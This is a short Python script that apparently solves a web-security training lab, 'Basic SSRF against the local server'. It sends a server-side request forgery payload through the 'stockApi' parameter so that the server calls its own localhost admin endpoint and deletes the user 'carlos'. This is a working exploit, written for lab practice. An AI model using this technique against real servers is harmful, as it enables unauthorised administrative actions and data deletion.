import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Basic SSRF against the local server"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'stockApi' parameter to delete carlos using SSRF against the local server\n2. Check that carlos doesn't exist anymore in the admin panel\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "stockApi")

    payload = "http://localhost/admin/delete?username=carlos"
    data = {"stockApi": payload}

    print(Fore.WHITE + "Injecting payload to delete carlos using SSRF against the local server")

    try:
        r = requests.post(
            f"{url}/product/stock", data=data, verify=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
